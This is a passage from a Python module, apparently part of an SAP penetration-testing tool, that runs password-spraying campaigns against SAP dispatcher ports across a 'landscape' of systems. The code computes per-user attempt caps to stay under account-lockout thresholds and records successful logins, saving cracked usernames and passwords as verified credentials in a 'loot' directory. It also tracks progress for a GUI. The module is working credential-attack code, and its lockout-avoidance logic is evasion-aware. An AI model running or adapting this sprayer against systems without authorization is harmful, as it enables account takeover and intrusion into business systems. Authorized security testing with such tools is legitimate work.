                    lnode._propagate_locked_out = True
            break
        # Per-node attempt budget (dry-run just reports the planned cap)
        budget = compute_attempt_budget(
            node, config.cap_per_user,
            probe_fn=(None if config.dry_run else telemetry_probe_fn))
        cap_for_this_target = budget["cap_per_user"]
        node.lockout_profile = {
            "fails_to_user_lock": budget.get("fails_to_user_lock"),
            "cap_computed": cap_for_this_target,
            "cap_source": budget.get("cap_source", ""),
            "probed_at": datetime.utcnow().isoformat(),
            "warnings": list(budget.get("warnings", [])),
        }

        if config.dry_run:
            # Preview mode — don't open sockets; just record what we
            # WOULD have attempted so the UI's preview knows.
            continue

        def _on_result(row: dict) -> None:
            nonlocal total_locks_observed
            # Persist attempt to disk + optional callback for progress UI
            attempt = SprayAttempt(
                ts=datetime.utcnow().isoformat(),
                sid=target.sid, host=target.host,
                dispatcher_port=target.dispatcher_port,
                client=row.get("client", ""),
                user=row.get("user", ""),
                pw_sha256_prefix=row.get("pw_sha256_prefix", ""),
                source_kind=row.get("source_kind", ""),
                source_sid=row.get("source_sid", ""),
                result=row.get("result", ""),
                detail=row.get("detail", ""),
                terminal=config.effective_terminal(),
                skipped_reason=row.get("skipped_reason", ""),
            )
            if attempts_jsonl_path:
                _append_attempt_jsonl(attempts_jsonl_path, attempt)
            if on_attempt is not None:
                try:
                    on_attempt(attempt)
                except Exception:
                    logger.debug("on_attempt callback raised",
                                 exc_info=True)
            run.attempts_done += 1
            _status.attempts_done = run.attempts_done
            kind = row.get("kind")
            if kind == "hit":
                hit = {"sid": target.sid, "client": row.get("client"),
                       "user": row.get("user"),
                       "source_kind": row.get("source_kind"),
                       "source_sid": row.get("source_sid"),
                       "result": row.get("result")}
                run.hits.append(hit)
                _status.hits = len(run.hits)
                _append_log(
                    f"HIT {target.sid}/{row.get('client')} user="
                    f"{row.get('user')} src={row.get('source_kind')}")
                _upgrade_or_append_credential(node, dict(
                    username=row["user"], password=row["password"],
                    client=row["client"], instance_nr="",
                    verified=True, kind="spray"))
                # Persist counter so a crash-restart doesn't re-burn
                # budget on this (sid, client, user) triple.
                counter_key = (
                    f"{target.sid}|{row['client']}|{row['user'].upper()}")
                prior = state.spray_attempts_counter.get(counter_key, {})
                state.spray_attempts_counter[counter_key] = {
                    "count": prior.get("count", 0) + 1,
                    "last_result": row.get("result"),
                    "last_at": datetime.utcnow().isoformat(),
                    "locked_observed": prior.get("locked_observed", False),
                    "cap_computed": cap_for_this_target,
                    "cap_source": budget.get("cap_source", ""),
                    "baseline_counter_at_probe": prior.get(
                        "baseline_counter_at_probe", -1),
                }
            elif kind == "locked":
                total_locks_observed += 1
                node._propagate_locked_out = True
                _record_lockout_landscape_wide(
                    state, target.sid, row.get("client", ""),
                    row.get("user", ""))
                if row.get("user") not in run.locked_users:
                    run.locked_users.append(row["user"])
                _status.locks = len(run.locked_users)
                _append_log(
                    f"LOCK {target.sid}/{row.get('client')} user="
                    f"{row.get('user')}")
            elif kind == "skipped":
                run.skipped.append({"sid": target.sid,
                                    "user": row.get("user"),
                                    "client": row.get("client"),
                                    "reason": row.get("skipped_reason")})

        check_sprayed_credentials(
            target.host, target.dispatcher_port, target.clients, pool,
            cap_per_user=cap_for_this_target,
            saprouter=target.saprouter,
            terminal=config.effective_terminal(),
            pre_known_locked_users=pre_locked,
            skip_users=skip_users,
            cancel_check=cancel_check,
            early_exit_on_hit=config.early_exit_on_hit,
            on_result=_on_result,
            try_login_fn=try_login_fn,
        )
        # Node summary tooltip
        node.spray_last_run = {
            "run_id": config.run_id,
            "ts": datetime.utcnow().isoformat(),
            "attempts": sum(1 for h in run.hits if h["sid"] == target.sid),
            "hits": sum(1 for h in run.hits if h["sid"] == target.sid),
            "locked_users": list(run.locked_users),
        }
        # Refresh pre_locked between targets so a lock we just observed
        # bans the user on every remaining target.
        pre_locked = {u.upper() for u in (
            state.pwspray_locked_users or {}).keys()}
        _bump_targets_done()
        _set_phase_progress(_status.targets_done, len(targets))
        # Inter-node pause.
        if ti < len(targets) - 1:
            _jittered_sleep(DEFAULT_INTER_NODE_SLEEP)

    _set_phase("report")
    run.finished_at = datetime.utcnow().isoformat()
    state.spray_runs.append(run.to_dict())
    _finalise_status(run)
    return run


def spray_single_node(
    node,
    state,
    config: Optional[SprayConfig] = None,
    *,
    cancel_check: Optional[Callable[[], bool]] = None,
    try_login_fn: Optional[Callable] = None,
    telemetry_probe_fn: Optional[Callable[[object], dict]] = None,
    loot_dir_fn: Optional[Callable[[str], str]] = None,
    on_attempt: Optional[Callable[[SprayAttempt], None]] = None,
) -> SprayRun:
    """Thin wrapper over :func:`spray_landscape` scoped to one node.
    Backs the per-node ctx-menu action."""
    return spray_landscape(
        state, config,
        scope_filter={"single_sid": node.sid},
        cancel_check=cancel_check,
        try_login_fn=try_login_fn,
        telemetry_probe_fn=telemetry_probe_fn,
        loot_dir_fn=loot_dir_fn,
        on_attempt=on_attempt,
    )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _default_loot_dir(run_id: str) -> str:
    """Resolve ``loot/spray/<run_id>/`` using the shared loot helper
    when importable; falls back to a scratch dir under /tmp if the
    helper isn't on the path.  Only called on real (non-dry) runs."""
    try:
        from sapmap_state import ensure_loot_dir
    except Exception:
        base = os.path.join("/tmp", "sapmap_loot_spray", run_id)
        os.makedirs(base, exist_ok=True)
        return base
    base = ensure_loot_dir(f"spray/{run_id}")
    os.makedirs(base, exist_ok=True)
    return base


# ---------------------------------------------------------------------------
# Status singleton (issue #69, PR3)
#
# Mirrors the AutoPwn status pattern (sapmap_autopwn._status):
#  - process-global singleton written by the orchestrator thread
#  - read by Bottle request threads serving GET /status
#  - no lock needed because writers are always SINGLE-WRITER (the one
#    _bg thread spawned by the launch route)
#
# Phase order drives the progress panel.  Keep this in sync with the
# frontend's phaseOrder array; the strings are the canonical phase
# names across backend + frontend + script-runner.
# ---------------------------------------------------------------------------

PHASE_ORDER = [
    "idle",
    "collect_pool",
    "profile_probe",
    "spray",
    "report",
    "done",
]


@dataclass
class PwSprayStatus:
    """Operator-facing snapshot of the currently-running (or last-
    completed) spray.  Serialised directly into the /status payload
    — don't add fields the GUI shouldn't see."""
    running: bool = False
    finished: bool = False
    phase: str = "idle"
    # phase_progress is [done, total] for a progress-bar-friendly
    # within-phase indicator.  Zero total == indeterminate.
    phase_progress: Tuple[int, int] = (0, 0)
    run_id: str = ""
    scope: str = ""              # 'landscape' / 'single:<sid>' / 'preview'
    dry_run: bool = True
    cap_per_user: int = 1
    targets_total: int = 0
    targets_done: int = 0
    attempts_total: int = 0
    attempts_done: int = 0
    hits: int = 0
    locks: int = 0
    skipped_count: int = 0
    aborted: str = ""
    started_at: str = ""
    finished_at: str = ""
    # Short log tail for the progress panel's console pane.  Capped
    # by _append_log so the serialized payload stays small.
    log_tail: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        d = asdict(self)
        d["phase_progress"] = list(d["phase_progress"])
        return d


_status: PwSprayStatus = PwSprayStatus()


def get_status() -> dict:
    """Return the current pwspray status as a plain dict suitable for
    ``json.dumps``.  Called by Bottle request threads; the single-
    writer invariant means we don't need a lock."""
    return _status.to_dict()


def _reset_status(**init) -> PwSprayStatus:
    """Start a new run: wipe the singleton and seed with the fields the
    orchestrator knows up-front (scope, dry_run, cap_per_user, run_id)."""
    global _status
    _status = PwSprayStatus(running=True, phase="idle", **init)
    return _status


def _set_phase(phase: str) -> None:
    """Advance the phase marker.  No-op when the phase is unknown so
    tests don't have to monkey-patch PHASE_ORDER to use a subset."""
    if phase not in PHASE_ORDER:
        logger.debug("ignoring unknown phase %r", phase)
        return
    _status.phase = phase
    _status.phase_progress = (0, 0)


def _set_phase_progress(done: int, total: int) -> None:
    _status.phase_progress = (int(done), int(total))


def _bump_targets_done() -> None:
    _status.targets_done += 1


def _append_log(line: str, *, cap: int = 200) -> None:
    """Push a short log line into the status's log tail.  Kept small
    (200 lines) so the serialized payload stays legible; the full
    attempts audit lives on disk in loot/spray/<run_id>/."""
    _status.log_tail.append(line)
    if len(_status.log_tail) > cap:
        del _status.log_tail[0:len(_status.log_tail) - cap]


def _finalise_status(run) -> None:
    """Called once at the end of spray_landscape.  Pulls the final
    tallies off the SprayRun so GET /status reflects the result
    without the caller having to also poll /runs."""
    _status.running = False
    _status.finished = True
    _status.phase = "done"
    _status.run_id = run.run_id
    _status.attempts_total = run.attempts_total
    _status.attempts_done = run.attempts_done
    _status.hits = len(run.hits or [])
    _status.locks = len(run.locked_users or [])
    _status.skipped_count = len(run.skipped or [])
    _status.aborted = run.aborted or ""
    _status.started_at = run.started_at
    _status.finished_at = run.finished_at
